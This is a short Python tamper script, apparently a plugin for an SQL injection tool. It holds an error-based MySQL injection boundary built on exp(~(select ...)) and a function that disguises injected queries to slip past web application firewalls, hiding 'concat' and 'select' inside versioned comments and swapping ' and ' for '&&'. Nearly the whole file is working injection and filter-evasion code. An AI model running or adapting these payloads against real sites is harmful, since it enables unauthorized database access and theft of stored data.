#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org

b = " xor exp(~(select * from(select (%query))a))"


def do(strings):
    if "concat" in strings:
        strings = strings.replace('concat(',"/*!concat*/(")
    strings = strings.replace('select','/*!50000select/*!40000*/')
    strings = strings.replace(' and ',"&&")
    return strings


def tamper(boundary,query):
    # print 'tamper'
    # boundary = b
    boundary = do(boundary)
    query = do(query)
    return boundary,query